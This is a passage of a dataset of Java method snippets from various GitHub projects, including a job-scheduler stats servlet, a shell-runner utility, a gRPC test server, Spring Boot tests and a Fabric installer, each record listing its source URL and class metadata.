"https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/StatsServlet.java", "stars": "18", "class": {"name": "StatsServlet", "extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"method_name": "handleAJAXAction", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleAJAXAction(final HttpServletRequest req, final HttpServletResponse resp,      final Session session)      throws ServletException, IOException {    final HashMap<String, Object> ret = new HashMap<>();    final int executorId = getIntParam(req, ConnectorParams.EXECUTOR_ID_PARAM);    final String actionName = getParam(req, ConnectorParams.ACTION_PARAM);    if (actionName.equals(ConnectorParams.STATS_GET_METRICHISTORY)) {      handleGetMetricHistory(executorId, req, ret, session.getUser());    } else if (actionName.equals(ConnectorParams.STATS_GET_ALLMETRICSNAME)) {      handleGetAllMetricName(executorId, req, ret);    } else if (actionName.equals(ConnectorParams.STATS_SET_REPORTINGINTERVAL)) {      handleChangeConfigurationRequest(executorId, ConnectorParams.STATS_SET_REPORTINGINTERVAL, req,          ret);    } else if (actionName.equals(ConnectorParams.STATS_SET_CLEANINGINTERVAL)) {      handleChangeConfigurationRequest(executorId, ConnectorParams.STATS_SET_CLEANINGINTERVAL, req,          ret);    } else if (actionName.equals(ConnectorParams.STATS_SET_MAXREPORTERPOINTS)) {      handleChangeConfigurationRequest(executorId, ConnectorParams.STATS_SET_MAXREPORTERPOINTS, req,          ret);    } else if (actionName.equals(ConnectorParams.STATS_SET_ENABLEMETRICS)) {      handleChangeConfigurationRequest(executorId, ConnectorParams.STATS_SET_ENABLEMETRICS, req,          ret);    } else if (actionName.equals(ConnectorParams.STATS_SET_DISABLEMETRICS)) {      handleChangeConfigurationRequest(executorId, ConnectorParams.STATS_SET_DISABLEMETRICS, req,          ret);    }    writeJSON(resp, ret);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/StatsServlet.java", "stars": "18", "class": {"name": "StatsServlet", "extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"method_name": "handleGetAllMetricName", "params": ["int", "HttpServletRequest", "HashMap<String,Object>"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleGetAllMetricName(final int executorId, final HttpServletRequest req,      final HashMap<String, Object> ret) throws IOException {    final Map<String, Object> result;    try {      result =          this.execManagerAdapter.callExecutorStats(executorId,              ConnectorParams.STATS_GET_ALLMETRICSNAME,              (Pair<String, String>[]) null);      if (result.containsKey(ConnectorParams.RESPONSE_ERROR)) {        ret.put(\"error\", result.get(ConnectorParams.RESPONSE_ERROR).toString());      } else {        ret.put(\"metricList\", result.get(\"data\"));      }    } catch (final ExecutorManagerException e) {      logger.error(e.getMessage(), e);      ret.put(\"error\", \"Failed to fetch metric names for executor : \"          + executorId);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/StatsServlet.java", "stars": "18", "class": {"name": "StatsServlet", "extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"method_name": "handleChangeConfigurationRequest", "params": ["int", "String", "HttpServletRequest", "HashMap<String,Object>"], "throws": ["ServletException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleChangeConfigurationRequest(final int executorId, final String actionName,      final HttpServletRequest req, final HashMap<String, Object> ret)      throws ServletException, IOException {    try {      final Map<String, Object> result =          this.execManagerAdapter              .callExecutorStats(executorId, actionName, getAllParams(req));      if (result.containsKey(ConnectorParams.RESPONSE_ERROR)) {        ret.put(ConnectorParams.RESPONSE_ERROR,            result.get(ConnectorParams.RESPONSE_ERROR).toString());      } else {        ret.put(ConnectorParams.STATUS_PARAM,            result.get(ConnectorParams.STATUS_PARAM));      }    } catch (final ExecutorManagerException ex) {      logger.error(ex.getMessage(), ex);      ret.put(\"error\", \"Failed to change config change\");    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/StatsServlet.java", "stars": "18", "class": {"name": "StatsServlet", "extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"method_name": "handleGetMetricHistory", "params": ["int", "HttpServletRequest", "HashMap<String,Object>", "User"], "throws": ["IOException", "ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleGetMetricHistory(final int executorId, final HttpServletRequest req,      final HashMap<String, Object> ret, final User user) throws IOException,      ServletException {    try {      final Map<String, Object> result =          this.execManagerAdapter.callExecutorStats(executorId,              ConnectorParams.STATS_GET_METRICHISTORY, getAllParams(req));      if (result.containsKey(ConnectorParams.RESPONSE_ERROR)) {        ret.put(ConnectorParams.RESPONSE_ERROR,            result.get(ConnectorParams.RESPONSE_ERROR).toString());      } else {        ret.put(\"data\", result.get(\"data\"));      }    } catch (final ExecutorManagerException ex) {      logger.error(ex.getMessage(), ex);      ret.put(\"error\", \"Failed to fetch metric history\");    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/StatsServlet.java", "stars": "18", "class": {"name": "StatsServlet", "extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"method_name": "handleStatePageLoad", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleStatePageLoad(final HttpServletRequest req, final HttpServletResponse resp,      final Session session)      throws ServletException {    final Page page = newPage(req, resp, session, \"azkaban/webapp/servlet/velocity/statsPage.vm\");    try {      final Collection<Executor> executors = this.execManagerAdapter.getAllActiveExecutors();      page.add(\"executorList\", executors);      if (executors.isEmpty()) {        throw new ExecutorManagerException(\"Executor list is empty.\");      }      final Map<String, Object> result =          this.execManagerAdapter.callExecutorStats(executors.iterator().next().getId(),              ConnectorParams.STATS_GET_ALLMETRICSNAME,              (Pair<String, String>[]) null);      if (result.containsKey(ConnectorParams.RESPONSE_ERROR)) {        page.add(\"errorMsg\", result.get(ConnectorParams.RESPONSE_ERROR)            .toString());      } else {        page.add(\"metricList\", result.get(\"data\"));      }    } catch (final Exception e) {      logger.error(e.getMessage(), e);      page.add(\"errorMsg\", \"Failed to get a response from Azkaban exec server\");    }    String languageType = LoadJsonUtils.getLanguageType();    page.add(\"currentlangType\", languageType);    page.render();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/StatsServlet.java", "stars": "18", "class": {"name": "StatsServlet", "extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"method_name": "handlePost", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void handlePost(final HttpServletRequest req, final HttpServletResponse resp,      final Session session)      throws ServletException,      IOException {  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/StatsServlet.java", "stars": "18", "class": {"name": "StatsServlet", "extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"method_name": "getAllParams", "params": ["HttpServletRequest"], "throws": null, "modifiers": ["private"], "return_type": "Pair<String,String>", "snippet": "  private Pair<String, String>[] getAllParams(final HttpServletRequest req) {    final List<Pair<String, String>> allParams = new LinkedList<>();    final Iterator it = req.getParameterMap().entrySet().iterator();    while (it.hasNext()) {      final Map.Entry pairs = (Map.Entry) it.next();      for (final Object value : (String[]) pairs.getValue()) {        allParams.add(new Pair<>((String) pairs.getKey(), (String) value));      }    }    return allParams.toArray(new Pair[allParams.size()]);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/StatsServlet.java", "stars": "18", "class": {"name": "StatsServlet", "extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"method_name": "createProcBuilder", "params": ["String", "Map<String,String>", "File"], "throws": null, "modifiers": ["public", "static"], "return_type": "ProcessBuilder", "snippet": "    public static ProcessBuilder createProcBuilder(String command,                                                   Map<String, String> env, File workDir){        ProcessBuilder builder = new ProcessBuilder(\"/bin/bash\", \"-c\", command);        if(null != env){            builder.environment().putAll(env);        }        builder.directory(workDir);        return builder;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/RunShell.java", "stars": "23", "class": {"name": "RunShell", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "run", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int run() {        ProcessBuilder builder = new ProcessBuilder(cmd);        try {            process = builder.start();            exitCode = process.waitFor();        } catch (IOException | InterruptedException e) {            if(e instanceof InterruptedException){                Thread.currentThread().interrupt();            }            log.error(\"Run shell: [\" + cmd +\"] Error\", e);        }        return exitCode;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/RunShell.java", "stars": "23", "class": {"name": "RunShell", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getResult", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getResult(){        StringBuilder result = new StringBuilder();        BufferedReader input;        try {            if (exitCode == 0) {                 input = new BufferedReader(new InputStreamReader(process.getInputStream()));            } else {                input = new BufferedReader(new InputStreamReader(process.getErrorStream()));            }            String line;            while ((line = input.readLine()) != null) {                result.append(line);            }        }catch(IOException e){            String message = \"Get result from cmd: [\"+ cmd+\"] Error\";            throw new RuntimeException(message, e);        }        return result.toString().trim();    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/RunShell.java", "stars": "23", "class": {"name": "RunShell", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreateViewHolder", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "ViewHolder", "snippet": "    public ViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {        View view = LayoutInflater.from(parent.getContext()).inflate(R.layout.item_fortune_record, parent, false);        ViewHolder holder = new ViewHolder(view);        return holder;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/FortuneRecordAdapter.java", "stars": "1", "class": {"name": "FortuneRecordAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "onBindViewHolder", "params": ["ViewHolder", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(ViewHolder holder, int position) {        String data = mList.get(position);        holder.mTvType.setText(data);        holder.mRLayoutRoot.setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View view) {                Intent intent = new Intent(mContext, RecordInfoActivity.class);                mContext.startActivity(intent);            }        });    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/FortuneRecordAdapter.java", "stars": "1", "class": {"name": "FortuneRecordAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "getItemCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemCount() {        return mList.size();    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/FortuneRecordAdapter.java", "stars": "1", "class": {"name": "FortuneRecordAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "build", "params": ["String", "WxMpXmlMessage", "WxMpService"], "throws": null, "modifiers": ["public"], "return_type": "WxMpXmlOutMessage", "snippet": "  public WxMpXmlOutMessage build(String content, WxMpXmlMessage wxMessage,                                 WxMpService service) {    WxMpXmlOutImageMessage m = WxMpXmlOutMessage.IMAGE().mediaId(content)        .fromUser(wxMessage.getToUser()).toUser(wxMessage.getFromUser())        .build();    return m;  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/builder/ImageBuilder.java", "stars": "2", "class": {"name": "ImageBuilder", "extends": "AbstractBuilder", "implements": null, "modifiers": ["public"]}}, {"method_name": "user", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String user() {\t\tString[] alphabet = { \"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \t\t\t\t\"n\", \"o\", \"p\", \"q\", \"r\",\"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\" };\t\t\t\t\t\tString rand_next = \"\";\t\tfor (int i = 0; i < 5; i++) {\t\t\tint pure_randomness = (int) (Math.random() * 25);\t\t\trand_next = rand_next + alphabet[pure_randomness];\t\t}\t\treturn rand_next;\t\t\t}", "url": "https://raw.githubusercontent.com/suncloudsmoon/Random-Trading/master/Random%20Trading/src/Random_Trader_Name.java", "stars": "2", "class": {"name": "Rand_Trader", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "handle", "params": ["WxMpXmlMessage", "Map<String,Object>", "WxMpService", "WxSessionManager"], "throws": null, "modifiers": ["public"], "return_type": "WxMpXmlOutMessage", "snippet": "  public WxMpXmlOutMessage handle(WxMpXmlMessage wxMessage,                                  Map<String, Object> context, WxMpService wxMpService,                                  WxSessionManager sessionManager) {    String openId = wxMessage.getFromUser();    this.logger.info(\"\u53d6\u6d88\u5173\u6ce8\u7528\u6237 OPENID: \" + openId);    // TODO \u53ef\u4ee5\u66f4\u65b0\u672c\u5730\u6570\u636e\u5e93\u4e3a\u53d6\u6d88\u5173\u6ce8\u72b6\u6001    return null;  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/handler/UnsubscribeHandler.java", "stars": "2", "class": {"name": "UnsubscribeHandler", "extends": "AbstractHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "start", "params": [], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void start() throws IOException {        /* The port on which the server should run */        int port = 8005;        server = ServerBuilder.forPort(port)                .addService(new SegmentServicesImpl())                .build()                .start();        logger.info(\"Server started, listening on \" + port);        Runtime.getRuntime().addShutdownHook(new Thread() {            @Override            public void run() {                // Use stderr here since the logger may have been reset by its JVM shutdown hook.                System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");                try {                    SegmentServer.this.stop();                } catch (InterruptedException e) {                    e.printStackTrace(System.err);                }                System.err.println(\"*** server shut down\");            }        });    }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/dist/benchmark/grpc-server/src/main/java/server/SegmentServer.java", "stars": "3", "class": {"name": "SegmentServer", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "stop", "params": [], "throws": ["InterruptedException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void stop() throws InterruptedException {        if (server != null) {            server.shutdown().awaitTermination(30, TimeUnit.SECONDS);        }    }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/dist/benchmark/grpc-server/src/main/java/server/SegmentServer.java", "stars": "3", "class": {"name": "SegmentServer", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "blockUntilShutdown", "params": [], "throws": ["InterruptedException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void blockUntilShutdown() throws InterruptedException {        if (server != null) {            server.awaitTermination();        }    }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/dist/benchmark/grpc-server/src/main/java/server/SegmentServer.java", "stars": "3", "class": {"name": "SegmentServer", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": ["IOException", "InterruptedException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws IOException, InterruptedException {        final SegmentServer server = new SegmentServer();        server.start();        server.blockUntilShutdown();    }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/dist/benchmark/grpc-server/src/main/java/server/SegmentServer.java", "stars": "3", "class": {"name": "SegmentServer", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "checkSeg", "params": ["SegmentReq", "StreamObserver<SegmentResp>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void checkSeg(SegmentReq request, StreamObserver<SegmentResp> responseObserver) {            String result = request.toString();            SegmentResp ruleResponse = SegmentResp.newBuilder()                    .setResult(\"okay-\" + System.currentTimeMillis() + \" \" + result)                    .build();            logger.info(request.toString());            responseObserver.onNext(ruleResponse);            responseObserver.onCompleted();        }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/dist/benchmark/grpc-server/src/main/java/server/SegmentServer.java", "stars": "3", "class": {"name": "SegmentServicesImpl", "extends": "SegmentServicesGrpc", "implements": null, "modifiers": ["static"]}}, {"method_name": "cleanUp", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid cleanUp() {\t\tif (this.context != null) {\t\t\tthis.context.close();\t\t}\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/OverrideSourcesTests.java", "stars": "47572", "class": {"name": "OverrideSourcesTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "beanInjectedToMainConfiguration", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid beanInjectedToMainConfiguration() {\t\tthis.context = SpringApplication.run(new Class<?>[] { MainConfiguration.class },\t\t\t\tnew String[] { \"--spring.main.web-application-type=none\" });\t\tassertThat(this.context.getBean(Service.class).bean.name).isEqualTo(\"foo\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/OverrideSourcesTests.java", "stars": "47572", "class": {"name": "OverrideSourcesTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "primaryBeanInjectedProvingSourcesNotOverridden", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid primaryBeanInjectedProvingSourcesNotOverridden() {\t\tthis.context = SpringApplication.run(new Class<?>[] { MainConfiguration.class, TestConfiguration.class },\t\t\t\tnew String[] { \"--spring.main.web-application-type=none\",\t\t\t\t\t\t\"--spring.main.allow-bean-definition-overriding=true\",\t\t\t\t\t\t\"--spring.main.sources=org.springframework.boot.OverrideSourcesTests.MainConfiguration\" });\t\tassertThat(this.context.getBean(Service.class).bean.name).isEqualTo(\"bar\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/OverrideSourcesTests.java", "stars": "47572", "class": {"name": "OverrideSourcesTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "another", "params": [], "throws": null, "modifiers": [], "return_type": "TestBean", "snippet": "\t\tTestBean another() {\t\t\treturn new TestBean(\"bar\");\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/OverrideSourcesTests.java", "stars": "47572", "class": {"name": "TestConfiguration", "extends": null, "implements": null, "modifiers": ["static"]}}, {"method_name": "first", "params": [], "throws": null, "modifiers": [], "return_type": "TestBean", "snippet": "\t\tTestBean first() {\t\t\treturn new TestBean(\"foo\");\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/OverrideSourcesTests.java", "stars": "47572", "class": {"name": "MainConfiguration", "extends": null, "implements": null, "modifiers": ["static"]}}, {"method_name": "Service", "params": [], "throws": null, "modifiers": [], "return_type": "Service", "snippet": "\t\tService Service() {\t\t\treturn new Service();\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/OverrideSourcesTests.java", "stars": "47572", "class": {"name": "MainConfiguration", "extends": null, "implements": null, "modifiers": ["static"]}}, {"method_name": "copyInstallFiles", "params": ["List<String>", "List<RoleEnum>", "InitConfigEntity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void copyInstallFiles(List<String> ipList, List<RoleEnum> roleList, InitConfigEntity configEntity) {        // \u5982\u679cmaster\u8282\u70b9\u4e0d\u62c5\u4efb\u4efb\u4f55\u89d2\u8272\uff0c\u5219\u8fd4\u56de\u7a7a        if (roleList.isEmpty()) {            return;        }        for (RoleEnum role : roleList) {            for (String ip : ipList) {                copyFiles(role, ip, modeService.getInstallPath(), configEntity);            }        }    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/FileService.java", "stars": "7", "class": {"name": "FileService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "copyFiles", "params": ["RoleEnum", "String", "String", "InitConfigEntity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void copyFiles(RoleEnum role, String ip, String destPath, InitConfigEntity configEntity) {        copyFiles(role, ip, null, destPath, null, configEntity, null);    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/FileService.java", "stars": "7", "class": {"name": "FileService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "copyFiles", "params": ["RoleEnum", "String", "String", "String", "String", "InitConfigEntity", "List<String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void copyFiles(RoleEnum role, String ip, String srcFolderName, String destPath, String destFolderName, InitConfigEntity configEntity, List<String> hostArray) {        FileUtil.makeFilePath(destPath, false);        String srcRootPath = FileUtil.reviseDir(modeService.getInitDir());        try {            String dockerSrcFile = srcRootPath + \"fabric-net\" + File.separator + \"dockerFile\" + File.separator;            if (!destPath.endsWith(File.separator)) {                destPath = destPath + File.separator;            }            copyCertFiles(role, ip, destPath, configEntity);            switch (role) {                case ORDER:                    String orderDir = dockerSrcFile + (StringUtils.isEmpty(srcFolderName) ? \"order-\" + ip : srcFolderName);                    if (!new File(orderDir).exists()) {                        // log.info(String.format(\"\u76ee\u5f55 %s \u4e0d\u5b58\u5728\", orderDir));                        log.info(String.format(\"Directory %s does not exist\", orderDir));                        break;                    }                    FileUtils.copyDirectory(new File(orderDir), new File(destPath + (StringUtils.isEmpty(destFolderName) ? \"order\" : destFolderName)));                    // \u9700\u8981\u590d\u5236\u521b\u4e16\u5757                    if (NetUtil.getLocalIPList().stream().noneMatch(i -> i.equalsIgnoreCase(ip))) {                        FileUtils.copyDirectory(new File(modeService.getInstallPath() + \"channel-artifacts\"), new File(destPath + \"channel-artifacts\"));                    }                    break;                case PEER:                    String peerDir = dockerSrcFile + (StringUtils.isEmpty(srcFolderName) ? \"peer-\" + ip : srcFolderName);                    if (!new File(peerDir).exists()) {                        // log.info(String.format(\"\u76ee\u5f55 %s \u4e0d\u5b58\u5728\", peerDir));                        log.info(String.format(\"Directory %s does not exist\", peerDir));                        break;                    }                    FileUtils.copyDirectory(new File(peerDir), new File(destPath + (StringUtils.isEmpty(destFolderName) ? \"peer\" : destFolderName)));                    break;            }        } catch (Exception e) {            // log.error(String.format(\"\u4e3a %s \u590d\u5236 %s \u89d2\u8272\u6587\u4ef6\u5931\u8d25\", ip, role.name()), e);            log.error(String.format(\"Failed to copy %s role files for %s\",  role.name(), ip), e);            e.printStackTrace();        }    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/FileService.java", "stars": "7", "class": {"name": "FileService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "copyCertFiles", "params": ["RoleEnum", "String", "String", "InitConfigEntity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void copyCertFiles(RoleEnum role, String ip, String destPath, InitConfigEntity configEntity) {        // log.info(String.format(\"\u4e3a\u670d\u52a1\u5668 %s \u89d2\u8272 %s \u590d\u5236\u8bc1\u4e66\u6587\u4ef6, \u76ee\u6807\u76ee\u5f55: %s\", ip, role.name(), destPath));        log.info(String.format(\"Copy certificate file for server %s role %s, target directory: %s\", ip, role.name(), destPath));        if (!destPath.endsWith(File.separator)) {            destPath = destPath + File.separator;        }        String certRootPath = destPath + CERTS_FOLDER_NAME + File.separator;        FileUtil.makeFilePath(certRootPath, false);        String midDirName01;        String midDirName02;        Map<String, String> hostConfig;        if (role == RoleEnum.ORDER) {            hostConfig = configEntity.getOrdererHostConfig();            midDirName01 = \"ordererOrganizations\";            midDirName02 = \"orderers\";        } else {            hostConfig = configEntity.getPeerHostConfig();            midDirName01 = \"peerOrganizations\";            midDirName02 = \"peers\";        }        for (String domain : hostConfig.keySet()) {            String val = hostConfig.get(domain);            int index = val.lastIndexOf(\":\");            if (val.substring(0, index).endsWith(ip)) {                int i = domain.indexOf(\".\");                String relativePath = midDirName01 + File.separator + domain.substring(i + 1)                        + File.separator + midDirName02 + File.separator + domain;                String srcDir = modeService.getInitDir() + \"fabric-net\" + File.separator + \"cryptoAndConfig\" + File.separator + \"crypto-config\"                        + File.separator + relativePath;                try {                    FileUtils.copyDirectory(new File(srcDir), new File(certRootPath + relativePath));                } catch (IOException e) {                    // log.error(String.format(\"\u590d\u5236%s\u8bc1\u4e66\u6587\u4ef6\u5f02\u5e38\", role.name()), e);                    log.error(String.format(\"An exception occurred while copying the %s certificate file\", role.name()), e);                    e.printStackTrace();                }            }        }    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/FileService.java", "stars": "7", "class": {"name": "FileService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "masterCopyCryptoConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void masterCopyCryptoConfig() {        String srcDir = modeService.getInitDir() + \"fabric-net\" + File.separator + \"cryptoAndConfig\" + File.separator + \"crypto-config\"                + File.separator;        try {            FileUtils.copyDirectory(new File(srcDir), new File(modeService.getInstallPath() + \"crypto-config\"));        } catch (IOException e) {            // log.error(\"\u4e3b\u8282\u70b9\u590d\u5236\u8bc1\u4e66\u6587\u4ef6\u5f02\u5e38\", e);            log.error(\"An exception occurred when the master node copied the certificate file\", e);            e.printStackTrace();        }    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/FileService.java", "stars": "7", "class": {"name": "FileService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "masterCopyConfigtxFile", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void masterCopyConfigtxFile() {        // log.info(\"\u590d\u5236 configtx.yaml \u6587\u4ef6\u5230\u5b89\u88c5\u76ee\u5f55\");        log.info(\"Copy the configtx.yaml file to the installation directory\");        FileUtil.makeFilePath(modeService.getInstallPath(), false);        String srcRootPath = FileUtil.reviseDir(modeService.getInitDir());        String srcFile = srcRootPath + \"fabric-net\" + File.separator + \"cryptoAndConfig\" + File.separator + \"configtx.yaml\";        try {            // log.info(\"\u751f\u6210\u521b\u4e16\u5757-\u4ece\" + srcFile + \"\u590d\u5236\u5230\" + modeService.getInstallPath() + \"configtx.yaml\");            log.info(\"Generate genesis block - from\" + srcFile + \"copy to\" + modeService.getInstallPath() + \"configtx.yaml\");            FileUtils.copyFile(new File(srcFile), new File(modeService.getInstallPath() + \"configtx.yaml\"));        } catch (IOException e) {            // log.error(\"\u590d\u5236 configtx.yaml \u6587\u4ef6\u5230\u5b89\u88c5\u76ee\u5f55\u5f02\u5e38\", e);            log.error(\"An exception occurred when copying the configtx.yaml file to the installation directory\", e);            e.printStackTrace();        }    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/FileService.java", "stars": "7", "class": {"name": "FileService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "packInstallFiles", "params": ["String", "List<RoleEnum>", "InitConfigEntity"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String packInstallFiles(String serverAddress, List<RoleEnum> roleList, InitConfigEntity configEntity) {        // log.info(String.format(\"\u4e3a\u670d\u52a1\u5668 %s \u51c6\u5907\u667a\u80fd\u5b89\u88c5\u5305, \u8be5\u670d\u52a1\u5668\u627f\u62c5\u7684\u89d2\u8272\uff1a%s\", serverAddress, roleList.stream().map(Enum::name).collect(Collectors.joining(\",\"))));        log.info(String.format(\"Prepare a smart installation package for server %s, the role assumed by this server is: %s\", serverAddress, roleList.stream().map(Enum::name).collect(Collectors.joining(\",\"))));        if (configEntity == null) {            try {                Yaml yaml = new Yaml();                configEntity = yaml.loadAs(new FileInputStream(new File(this.initConfigFile)), InitConfigEntity.class);            } catch (Exception e) {                // log.error(\"\u5b89\u88c5\u8fc7\u7a0b\u53d1\u751f\u5f02\u5e38\", e);                log.error(\"An exception occurred during the installation process\", e);                e.printStackTrace();            }        }        // \u5efa\u4e00\u4e2a\u4e34\u65f6\u76ee\u5f55        String tmpPath = System.getProperty(\"java.io.tmpdir\");        if (!tmpPath.endsWith(File.separator)) {            tmpPath = tmpPath + File.separator;        }        String rootPath = tmpPath + UUID.randomUUID().toString().replaceAll(\"-\", \"\") + File.separator;        String packSrcPath = rootPath + \"installFiles\" + File.separator;        